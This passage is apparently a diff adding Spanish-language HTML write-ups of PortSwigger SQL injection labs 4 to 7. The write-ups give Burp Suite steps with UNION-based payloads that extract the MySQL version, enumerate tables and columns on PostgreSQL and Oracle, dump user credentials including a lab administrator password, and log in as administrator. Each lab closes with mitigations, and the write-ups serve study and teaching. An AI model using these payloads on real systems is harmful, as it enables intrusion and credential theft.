+        <div class="code-block">SELECT name, description FROM products WHERE category = 'Gifts'</div>
+        <p>Pero como no valida correctamente la entrada del usuario, puedes cerrar la comilla y añadir tu propia consulta: <code>' UNION SELECT ...</code></p>
+        
+        <p><strong>La aplicación:</strong></p>
+        <ul>
+            <li>No sanitiza la entrada.</li>
+            <li>No usa consultas preparadas.</li>
+            <li>Permite concatenación directa del parámetro en la consulta SQL.</li>
+        </ul>
+        <p>Eso permite o deja abierto a romper la consulta original, inyectar un UNION SELECT, y poder extraer información arbitraria de la base de datos.</p>
+    </div>
+
+    <div class="lab-content">
+        <h3><i class="fas fa-terminal"></i> Procedimiento</h3>
+
+        <div class="step-detail">
+            <h4>Paso 1: Interceptar la petición con Burp Suite</h4>
+            <p>Una vez abierto el laboratorio y dentro de Burp Suite, usaremos el navegador de este el cual es Chromium. Dentro de Chromium entraremos con la url del laboratorio.</p>
+            <p>Volviendo a Burp Suite activamos <strong>intercept off</strong>, para así interceptar la petición.</p>
+            <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab4.1.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+            <p> Así se verá Burp Suite cuando haya interceptado peticiones:</p>
+            <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab4.2.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+            <p>Dentro del navegador de Chromium en la pagina del laboratorio, vamos a cambiar la categoria de productos, en este caso a <strong>Gifts</strong>, para hacer el tipo de petición que necesitamos, ya que ese parametro de category es vulnerable.</p>
+        </div>
+<div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab4.3.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+                    <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab4.4.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+        <div class="step-detail">
+            <h4>Paso 2: Confirmar que es vulnerable a SQLi</h4>
+            <p>Para confirmar que ese parametro es vulnerable a SQLi, enviamos la petición al repetidor, dentro de Burp Suite y la modificamos cambiando la categoría “Gift”, por: <code>Gift’</code></p>
+            <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab4.5.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+            <p>Como resultado de repetir la petición modificada, el servidor respondió con un un error, lo cual indica que es vulnerable ya que se rompió la consulta (muy buena señal de SQLi).</p>
+        </div>
+<div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab4.6.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+        <div class="step-detail">
+            <h4>Paso 3: Determinar número de columnas</h4>
+            <p>Sabemos que debemos usar UNION, pero necesitamos saber cuántas columnas devuelve la consulta original.</p>
+            <p><strong>Método 1: ORDER BY.</strong> Probaremos incrementando:</p>
+            <ul>
+                <li><code>Gifts' ORDER BY 1--+</code></li>
+                <li><code>Gifts' ORDER BY 2--+</code></li>
+                <li><code>Gifts' ORDER BY 3--+</code></li>
+            </ul>
+            <p>El lab indica que son 2 columnas. El servidor responde “ok”, lo cual indica que la inyección se hizo correctamente, el comentario <code>--+</code> está bien formado y que existen al menos 2 columnas.</p>
+        </div>
+<div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab4.7.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+        <div class="step-detail">
+            <h4>Paso 4: Probar UNION con 2 columnas</h4>
+            <p>Se identifica si ambas columnas aceptan texto. Usa el payload que indica el lab:</p>
+            <div class="code-block">'+UNION+SELECT+'abc','def'#</div>
+            <p>Se inyecta usando de nuevo el repetidor y la consulta. 
+                <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab4.8.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+                <strong>Resultado esperado:</strong> En la página podemos ver que se agregaron correctamente las cadenas “abc” y “def”.</p>
+        </div>
+        <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab4.9.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+        <div class="step-detail">
+            <h4>Paso 5: Extraer la versión</h4>
+            <p>Ahora ejecutamos el payload final:</p>
+            <div class="code-block">'+UNION+SELECT+@@version,+NULL#</div>
+            <p><strong>Explicación:</strong></p>
+            <ul>
+                <li><strong>@@version</strong> → variable del sistema que devuelve la versión.</li>
+                <li><strong>NULL</strong> → relleno para la segunda columna.</li>
+                <li><strong>#</strong> → comenta el resto (específico de MySQL).</li>
+            </ul>
+            <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab4.10.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+                    <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab4.11.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+            <p>Con esto la inyeccion funciono correctamente en el servidor y obtuvimos la versión: <code>8.0.42-0ubuntu0.20.04.1</code>, que corresponde a <strong>MySQL 8.0.42</strong>, corriendo en <strong>Ubuntu 20.04</strong>. Con esto el laboratorio queda solucionado.</p>
+        </div>
+        
+    <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab4.12.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+
+        <div class="mitigacion-card" style="background: #fdfdfd; border-left: 5px solid #272822; padding: 30px;">
+            <h3><i class="fas fa-file-alt"></i> Informe Final</h3>
+            
+            <h4>Vulnerabilidad Identificada</h4>
+            <p>Se identificó una SQL Injection basada en UNION en el parámetro <code>category</code> del filtro de productos. La aplicación construye consultas dinámicas concatenando directamente la entrada del usuario dentro de una cláusula WHERE, sin utilizar consultas parametrizadas ni mecanismos adecuados de sanitización.</p>
+            <p>La vulnerabilidad permite la manipulación de la estructura de la consulta SQL y la ejecución de instrucciones arbitrarias sobre el motor de base de datos. <strong>Impacto:</strong> Exposición de información sensible del sistema, incluyendo versión del gestor de base de datos.</p>
+
+            <h4>Payload Utilizado</h4>
+            <p>El payload exitoso fue: <code>' UNION SELECT @@version, NULL#</code></p>
+            <p>Este payload cierra la cadena original de la consulta y utiliza el operador UNION para combinar resultados. Invoca la variable global <strong>@@version</strong> del sistema en MySQL, permitiendo obtener la versión exacta del motor y usa NULL para respetar la cantidad de columnas requeridas. Emplea <strong>#</strong> para comentar el resto de la consulta original. Como resultado, se logró recuperar la cadena de versión del servidor de base de datos.</p>
+
+            <h4>Mitigación Recomendada</h4>
+            <ul>
+                <li>Uso obligatorio de <strong>consultas parametrizadas (Prepared Statements)</strong> para evitar la alteración de la estructura SQL.</li>
+                <li>Aplicación del principio de mínimo privilegio en la cuenta de base de datos utilizada por la aplicación.</li>
+                <li>Implementación de manejo seguro de errores para evitar filtración de información estructural.</li>
+                <li>Validación estricta del lado del servidor sobre los parámetros recibidos.</li>
+            </ul>
+            <p><strong>Severidad estimada:</strong> Alta | <strong>Riesgo principal:</strong> Enumeración del sistema y posible extracción completa de datos mediante explotación adicional.</p>
+        </div>
+    </div>
+</article>
+<article class="lab-card" id="lab-5">
+    <header class="lab-header">
+        <span class="badge practitioner" style="background: #f2994a;">Nivel: PRACTITIONER</span>
+        <h2>5. SQL injection attack, listing the database contents on non-Oracle databases</h2>
+    </header>
+
+    <div class="highlight-box">
+        <p><strong>Tipo de SQLi:</strong> Union-based SQL Injection (In-band / Clásico).</p>
+        <p><strong>Objetivo:</strong> Explotar una vulnerabilidad SQL Injection en el parámetro <code>category</code> del filtro de productos para enumerar sistemáticamente el contenido de la base de datos no-Oracle: determinar el número de columnas, listar las tablas del esquema <code>information_schema</code>, identificar la tabla que almacena las credenciales de usuarios, enumerar sus columnas relevantes y extraer los usernames y passwords (incluyendo las del usuario administrador) para lograr acceso no autorizado y resolver el desafío mediante login.</p>
+        
+        <p><strong>Vulnerabilidad:</strong> La aplicación construye una consulta SQL dinámica concatenando directamente el valor del parámetro <code>category</code> sin usar consultas parametrizadas ni validación adecuada.</p>
+        <p>La consulta original es del tipo <code>SELECT * FROM products WHERE category = 'input'</code>, con dos columnas devueltas (por ejemplo, nombre y descripción del producto). Al inyectar un cierre de comilla simple (<code>'</code>) seguido de <code>UNION SELECT</code>, es posible combinar los resultados originales con consultas arbitrarias que devuelven datos de otras tablas.</p>
+        <p>Como los resultados se reflejan directamente en la respuesta HTTP (en la lista de productos), se trata de un ataque Union-based (in-band), permitiendo enumeración visible y extracción de datos sin necesidad de técnicas inferenciales (blind) ni canales externos (out-of-band). El DBMS es <strong>PostgreSQL</strong> (evidenciado por tablas <code>pg_*</code> e <code>information_schema</code>).</p>
+    </div>
+
+    <div class="lab-content">
+        <h3><i class="fas fa-terminal"></i> Procedimiento</h3>
+        <p>El procedimiento se llevó a cabo mediante <strong>Burp Suite (Repeater y Proxy)</strong> para interceptar y modificar las solicitudes GET al endpoint <code>/filter?category=...</code>.</p>
+                <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab5.1.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+        <div class="step-detail">
+            <h4>Paso 1: Verificación de Columnas</h4>
+            <p>Se interceptó la solicitud <code>GET /filter?category=Gifts</code> y se modificó el parámetro para inyectar:</p>
+            <div class="code-block">Gifts' UNION SELECT 'abc','def'--</div>
+            <p>La respuesta mostró los valores "abc" y "def" renderizados como productos, confirmando una inyección exitosa y exactamente dos columnas de tipo texto compatibles con UNION.</p>
+        </div>
+        <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab5.2.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+        <div class="step-detail">
+            <h4>Paso 2: Listar Tablas</h4>
+            <p>Se envió el payload:</p>
+            <div class="code-block">Gifts' UNION SELECT table_name, NULL FROM information_schema.tables--</div>
+            <p>La respuesta HTML presentó una lista de tablas del sistema, entre las cuales se identificó <strong>users_wdykho</strong> como la tabla que contiene las credenciales de usuarios.</p>
+        </div>
+        <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab5.3.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+        <div class="step-detail">
+            <h4>Paso 3: Enumerar Columnas de la Tabla Identificada</h4>
+            <p>Se utilizó el payload:</p>
+            <div class="code-block">Gifts' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_wdykho'--</div>
+            <p>La respuesta mostró las columnas de la tabla, destacando <strong>username_eclowy</strong> y <strong>password_cvzrzx</strong> como las relevantes para autenticación.</p>
+        </div>
+        <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab5.4.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+                    <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab5.5.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+        <div class="step-detail">
+            <h4>Paso 4: Extracción de Credenciales</h4>
+            <p>Se ejecutó:</p>
+            <div class="code-block">Gifts' UNION SELECT password_cvzrzx, username_eclowy FROM users_wdykho--</div>
+            <p>La respuesta incluyó la lista completa de usuarios, permitiendo identificar el registro del usuario <strong>administrator</strong> junto con su contraseña correspondiente.</p>
+        </div>
+<div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab5.6.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+                    <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab5.7.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+        <div class="step-detail">
+            <h4>Paso 5: Acceso y Resolución</h4>
+            <p>Acceder al login en <code>/login</code> con:</p>
+            <ul>
+                <li><strong>Username:</strong> administrator</li>
+                <li><strong>Password:</strong> [Contraseña extraída del paso anterior]</li>
+            </ul>
+        </div>
+        <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab5.8.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+                    <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab5.9.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+                    <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab5.10.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+        <div class="highlight-box" style="border-left: 5px solid #272822; background: #f4f4f4;">
+            <h3>Explicación del payload</h3>
+            <p>El payload base utilizado sigue la estructura: <code>' UNION SELECT [columna1], [columna2] FROM [tabla]--</code></p>
+            <ul>
+                <li>El cierre de comilla simple (<strong>'</strong>) termina la cadena del WHERE original.</li>
+                <li><strong>UNION SELECT</strong> combina resultados adicionales.</li>
+                <li><strong>NULL</strong> o valores arbitrarios se usan en la segunda columna para cumplir con el número y tipos requeridos.</li>
+                <li><strong>--</strong> comenta el resto de la consulta original, evitando errores de sintaxis.</li>
+            </ul>
+            <p>Esta técnica permite enumeración progresiva: <strong>metadatos → estructura → datos</strong>. La confirmación de resolución se obtuvo al autenticarse exitosamente como administrator, activando el mensaje "Congratulations, you solved the lab!".</p>
+        </div>
+        <section class="mitigacion-section">
+            <h3><i class="fas fa-shield-alt"></i> Mitigación recomendada</h3>
+            <div class="mitigacion-card">
+                <p>La mitigación principal consiste en el uso obligatorio de <strong>consultas parametrizadas o sentencias preparadas</strong> en el código de la aplicación (ej. <code>PreparedStatement</code> en Java, <code>cursor.execute()</code> en Python). Adicionalmente:</p>
+                <ul>
+                    <li>Implementar <strong>validación de entrada estricta</strong> mediante listas blancas (whitelisting) de valores permitidos para el parámetro category.</li>
+                    <li>Aplicar el <strong>principio de menor privilegio</strong> en la cuenta de base de datos, restringiendo accesos a vistas como <code>information_schema</code>.</li>
+                    <li>Utilizar <strong>ORMs o frameworks</strong> que gestionen parametrización automática (Hibernate, Entity Framework, Django ORM).</li>
+                    <li>Como capa adicional, desplegar un <strong>Web Application Firewall (WAF)</strong> con reglas específicas para detectar patrones de SQLi (comillas, UNION, comentarios).</li>
+                </ul>
+            </div>
+        </section>
+    </div>
+</article>
+    <article class="lab-card" id="lab-6">
+    <header class="lab-header">
+        <span class="badge practitioner" style="background: #f2994a;">Nivel: PRACTITIONER</span>
+        <h2>6. SQL injection attack, listing the database contents on Oracle</h2>
+    </header>
+
+    <div class="highlight-box">
+        <p><strong>Tipo de SQLi:</strong> UNION-based SQL Injection en Oracle, ya que se utiliza la cláusula <code>UNION SELECT</code> para combinar los resultados de la consulta original con datos de otras tablas del sistema como <code>all_tables</code> y <code>all_tab_columns</code>.</p>
+        <p><strong>Objetivo:</strong> Enumerar el contenido de la base de datos para identificar la tabla que almacena credenciales de usuarios, descubrir sus columnas y extraer los nombres de usuario y contraseñas, con el fin de iniciar sesión como administrator.</p>
+        
+        <p><strong>Vulnerabilidad:</strong> La aplicación no valida ni sanitiza adecuadamente el parámetro <code>category</code>, permitiendo que un atacante inserte consultas SQL adicionales mediante UNION, lo que posibilita acceder a metadatos de la base de datos y extraer información sensible como credenciales de usuarios.</p>
+    </div>
+
+    <div class="lab-content">
+        <h3><i class="fas fa-terminal"></i> Procedimiento</h3>
+        <div class="step-detail">
+            <h4>Paso 1: Intercepción de categoría</h4>
+            <p>Se navegó a una categoría existente (Lifestyle). La solicitud GET fue interceptada y enviada a <strong>Repeater</strong> para manipulación.</p>
+        </div>
+        <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab6.1.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+        <div class="step-detail">
+            <h4>Paso 2: Confirmación del número de columnas (2 columnas)</h4>
+            <p>En <strong>Request Query Parameters</strong> (Ubicada en el menú de mano derecha, damos clic en la flecha para poder editar) se editó el parámetro category:</p>
+            <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab6.2.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+            <ul>
+                <li><strong>Valor original:</strong> Lifestyle</li>
+                <li><strong>Nuevo valor:</strong> <code>' UNION SELECT 'abc','def' FROM dual--</code></li>
+                <li>Se aplicó <strong>Apply changes</strong> (Burp codificó automáticamente a <code>%27%20UNION%20SELECT%20%27abc%27%2C%27def%27%20FROM%20dual--</code>).</li>
+            </ul>
+            <p>Como respuesta tuvimos los strings "abc" y "def" aparecieron como si fueran productos, lo cual confirmó 2 columnas de tipo texto y compatibilidad con UNION en Oracle.</p>
+        </div>
+        <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab6.3.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+                    <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab6.4.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+                    <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab6.5.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+                    <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab6.6.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+        <div class="step-detail">
+            <h4>Paso 3: Identificación de la Tabla</h4>
+            <p>Se editó <code>category</code> con: <code>' UNION SELECT table_name, NULL FROM all_tables--</code> (codificado automáticamente por Burp).</p>
+            <p>Se envió y como respuesta recibimos la lista de tablas del sistema, además se identificó la tabla de usuarios: <strong>USERS_LRTWKH</strong>.</p>
+        </div>
+        <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab6.7.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+                     <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab6.8.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+                     <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab6.9.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+        <div class="step-detail">
+            <h4>Paso 4: Descubrimiento de Columnas</h4>
+            <p>Se editó <code>category</code> con: <code>' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_LRTWKH'--</code> (codificado por Burp).</p>
+            <p>Se envió y pudimos identificar la lista de columnas, en la cual se identificaron las relevantes:</p>
+            <ul>
+                <li><strong>USERNAME_ZOWHGC</strong> (para usernames)</li>
+                <li><strong>PASSWORD_QUEGN</strong> (para contraseñas)</li>
+            </ul>
+        </div>
+         <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab6.10.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+                     <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab6.11.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+        <div class="step-detail">
+            <h4>Paso 5: Extracción de Datos (Payload Final)</h4>
+            <p>Se editó <code>category</code> con el payload final: <code>' UNION SELECT USERNAME_ZOWHGC, PASSWORD_QUEGN FROM USERS_LRTWKH--</code> (codificado automáticamente).</p>
+            <p>Se envió y recibimos de regreso la lista de usuarios renderizada en la página, en la cual se encontró el registro de <strong>administrator</strong> junto con su contraseña correspondiente: <code>qj8cqcdydj1e6nxhiphj</code></p>
+        </div>
+         <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab6.12.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+                     <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab6.13.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+        <div class="step-detail">
+            <h4>Paso 6: Login y Resolución</h4>
+            <p>Nos dirigimos a la sección de <strong>My Account</strong> e ingresamos las credenciales extraídas:</p>
+            <ul>
+                <li><strong>Username:</strong> administrator</li>
+                <li><strong>Password:</strong> qj8cqcdydj1e6nxhiphj</li>
+                <li>Se presionó <strong>Log in</strong> y entramos exitosamente.</li>
+            </ul>
+        </div>
+         <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab6.14.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+        <div class="highlight-box" style="border-left: 5px solid #272822; background: #f9f9f9;">
+            <h3>Explicación del Payload</h3>
+            <p>El payload principal utilizado sigue la estructura típica de un ataque Union-based en Oracle: <code>' UNION SELECT [columna1], [columna2] FROM [vista/tabla]--</code></p>
+            <ul>
+                <li><strong>'</strong> cierra la cadena literal del parámetro category en la consulta original.</li>
+                <li><strong>UNION SELECT</strong> combina los resultados de la consulta original con una nueva SELECT arbitraria.</li>
+                <li>La segunda columna se rellena con <strong>NULL</strong> para mantener la compatibilidad con las dos columnas devueltas por la consulta base.</li>
+                <li><strong>--</strong> inicia un comentario de línea que descarta el resto de la instrucción SQL original, evitando errores de sintaxis.</li>
+            </ul>
+            <p>Todos los payloads se editaron y codificaron automáticamente en <strong>Request Query Parameters</strong> de Burp Repeater para garantizar sintaxis correcta en la URL.</p>
+        </div>
+
+        <section class="mitigacion-section">
+            <h3><i class="fas fa-shield-alt"></i> Mitigación recomendada</h3>
+            <div class="mitigacion-card">
+                <ul>
+                    <li>Utilizar <strong>consultas parametrizadas</strong> o prepared statements en todas las interacciones con la base de datos (ej. <code>PreparedStatement</code> en Java, <code>DBMS_SQL</code> con bind variables en PL/SQL).</li>
+                    <li>Aplicar <strong>validación estricta de entradas</strong> mediante listas blancas (whitelisting) para el parámetro category, permitiendo solo valores predefinidos.</li>
+                    <li>Restringir permisos de la cuenta de aplicación en Oracle: revocar acceso a vistas de metadatos como <code>all_tables</code> y <code>all_tab_columns</code> (<strong>principio de menor privilegio</strong>).</li>
+                    <li>Emplear <strong>ORMs o frameworks</strong> que gestionen parametrización automática (Hibernate, Spring Data JPA).</li>
+                    <li>Implementar <strong>Web Application Firewall (WAF)</strong> con reglas específicas para detectar patrones de SQLi (comillas, UNION, comentarios --).</li>
+                    <li>Evitar almacenar contraseñas en texto plano; usar <strong>hashing seguro</strong> (bcrypt, Argon2).</li>
+                </ul>
+            </div>
+        </section>
+    </div>
+</article>
+
+<article class="lab-card" id="lab-7">
+    <header class="lab-header">
+        <span class="badge apprentice">Nivel: Apprentice (Principiante)</span>
+        <h2>7. SQL injection UNION attack, determining the number of columns returned by the query</h2>
+    </header>
+
+    <div class="highlight-box">
+        <p>Este laboratorio tiene una dificultad básica y está diseñado para aprender a identificar cuántas columnas devuelve una consulta SQL, requisito necesario para realizar ataques UNION.</p>
+        <p><strong>Tipo de SQLi:</strong> SQL Injection basada en UNION (UNION-based SQL Injection). Este tipo de inyección permite combinar el resultado de una consulta original con otra consulta controlada por el atacante usando la palabra clave UNION.</p>
+        <p>Para que el ataque funcione, ambas consultas deben tener:</p>
+        <ul>
+            <li>El mismo número de columnas</li>
+            <li>Tipos de datos compatibles</li>
+        </ul>
+        <p>Por esta razón, primero se debe determinar cuántas columnas devuelve la consulta original.</p>
+    </div>
+
+    <div class="lab-content">
+        <h3><i class="fas fa-crosshairs"></i> Objetivo</h3>
+        <p>El objetivo del laboratorio es determinar cuántas columnas devuelve la consulta SQL del servidor utilizando una inyección UNION.</p>
+
+        <p><strong>Vulnerabilidad:</strong> La vulnerabilidad ocurre porque la aplicación inserta directamente el valor del parámetro en una consulta SQL sin validarlo ni sanitizarlo.</p>
+
+        <h3><i class="fas fa-terminal"></i> Pasos del Procedimiento</h3>
+
+        <div class="step-detail">
+            <h4>1. Acceder al laboratorio</h4>
+            <p>Primero ingresamos al laboratorio de Web Security Academy y copiamos el enlace generado para el ejercicio. Al abrir la página se muestra una tienda en línea con diferentes categorías de productos como Accessories, Clothing, Corporate gifts, Lifestyle y Tech gifts.</p>
+            <p>Estas categorías funcionan como filtros y envían una solicitud al servidor utilizando el parámetro <code>category</code>, el cual posteriormente será utilizado para probar la vulnerabilidad.</p>
+        </div>
+        <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab7.1.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+        <div class="step-detail">
+            <h4>2. Abrir Burp Suite y activar el proxy</h4>
+            <p>Después abrimos Burp Suite Community Edition y nos dirigimos al apartado: <strong>Proxy → Intercept</strong>.</p>
+            <p>Activamos la opción <strong>Intercept is on</strong> para que Burp pueda interceptar las peticiones HTTP entre el navegador y el servidor. Posteriormente seleccionamos <strong>Open browser</strong>, lo que abre el navegador integrado de Burp, el cual ya está configurado para pasar todo el tráfico a través del proxy.</p>
+        </div>
+        <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab7.2.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+        <div class="step-detail">
+            <h4>3. Interceptar la petición del filtro</h4>
+            <p>Dentro del navegador de Burp pegamos el link del laboratorio y cargamos la página. Luego seleccionamos la categoría Accessories. Al hacer clic, Burp intercepta la solicitud enviada al servidor, donde se observa una petición como la siguiente:</p>
+            <div class="code-block">GET /filter?category=Accessories</div>
+            <p>Esto indica que el parámetro <code>category</code> controla qué productos se muestran en la página.</p>
+        </div>
+        <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab7.3.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+        <div class="step-detail">
+            <h4>4. Enviar la petición al Repeater</h4>
+            <p>Una vez identificada la petición que contiene el parámetro vulnerable, hacemos clic derecho sobre la solicitud interceptada y seleccionamos la opción: <strong>Send to Repeater</strong>.</p>
+            <p>El módulo Repeater permite reenviar la misma petición varias veces modificando sus parámetros, lo cual es útil para probar diferentes ataques de inyección SQL.</p>
+        </div>
+        <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab7.4.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+        <div class="step-detail">
+            <h4>5. Probar la inyección UNION</h4>
+            <p>En el Repeater se modifica el parámetro <code>category</code> agregando el siguiente payload:</p>
+            <div class="code-block">' UNION SELECT NULL--</div>
+            <p>Y se envía la petición al servidor. La respuesta devuelve un <strong>error 500</strong>, lo que indica que el número de columnas en el UNION SELECT no coincide con el número de columnas de la consulta original.</p>
+        </div>
+        <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab7.5.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+        <div class="step-detail">
+            <h4>6. Encontrar el número correcto de columnas</h4>
+            <p>Para encontrar el número correcto de columnas se vuelve a modificar la consulta agregando más valores NULL:</p>
+            <div class="code-block">' UNION SELECT NULL,NULL,NULL--</div>
+            <p>Después de enviar nuevamente la petición, el servidor responde con <strong>HTTP 200 OK</strong>, lo que indica que la consulta fue aceptada. Esto confirma que la consulta original devuelve <strong>3 columnas</strong>.</p>
+        </div>
+        <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab7.6.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+        <div class="step-detail">
+            <h4>7. Laboratorio resuelto</h4>
+            <p>Al determinar correctamente el número de columnas, el laboratorio se marca automáticamente como resuelto y aparece el mensaje: <strong>“Congratulations, you solved the lab!”</strong>. Esto confirma que se logró completar exitosamente el objetivo del ejercicio.</p>
+        </div>
+        <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/lab7.7.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+
+        <section class="mitigacion-section">
+            <h3><i class="fas fa-shield-alt"></i> Mitigación recomendada</h3>
+            <div class="mitigacion-card">
+                <p>Para evitar ataques de tipo UNION-based SQL Injection, se deben aplicar medidas similares que impidan la manipulación directa de las consultas SQL.</p>
+                <ul>
+                    <li><strong>Consultas parametrizadas:</strong> La principal mitigación consiste en el uso de consultas parametrizadas o prepared statements, las cuales evitan que los valores introducidos por el usuario alteren la estructura de la consulta SQL.</li>
